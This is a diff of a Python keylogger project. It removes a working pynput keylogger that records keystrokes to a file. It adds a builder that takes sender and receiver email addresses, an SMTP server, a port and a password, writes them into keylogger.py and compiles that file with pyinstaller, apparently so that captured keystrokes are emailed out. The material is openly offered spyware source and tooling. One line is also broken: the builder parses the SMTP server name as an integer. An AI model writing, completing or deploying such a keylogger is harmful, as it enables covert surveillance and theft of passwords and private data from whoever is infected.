@@ -1,7 +1,4 @@
-from pynput import keyboard
-import time
-import os
-log_file = "key_log.txt"
+import os 
 
 print("""
  ██████╗  █████╗ ███████╗███████╗██╗   ██╗    ██╗     ██╗ ██████╗ ███████╗██╗
@@ -15,31 +12,21 @@ print("""
             Be warned... every keystroke will be watched closely.
             There’s no turning back now. Are you prepared?
 """)
+sender_email = input("Enter your sender email: ")
+receiver_email = input("Enter your receiver email: ")
+smtp_server = int(input("Enter SMTP server: "))
+smtp_port = int(input("Enter the SMTP Port: "))
+smtp_password = input("Enter SMTP Password: ")
 
-time.sleep(2)
-os.system('cls')
-print('Keylogger Listening....')
-def on_press(key):
-    try:
-        with open(log_file, "a") as file:
-            if key == keyboard.Key.space:
-                file.write(" ")
-            elif key == keyboard.Key.backspace:
-                pass  
-            elif key == keyboard.Key.enter:
-                file.write("\n")
-            elif hasattr(key, 'char') and key.char is not None and key.char.isalpha():  
-                file.write(f"{key.char}")
-            else:
-                pass 
-    except AttributeError:  
-        with open(log_file, "a") as file:
-            file.write(f"[{key}]")
+with open('keylogger.py','r+') as file:
+    content=file.readlines()
+    content[40] = f'sender_email = "{sender_email}"\n'
+    content[41] = f'receiver_email = "{receiver_email}"\n'
+    content[42] = f'smtp_server = "{smtp_server}"\n'
+    content[43] = f'smtp_port = "{smtp_port}"\n'
+    content[44] = f'smtp_password = "{smtp_password}"\n'
+    file.seek(0)
+    file.writelines(content)
 
-def on_release(key):
-    if key == keyboard.Key.esc:  
-        return False
 
-while True:
- with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
+os.system('pyinstaller keylogger.py')
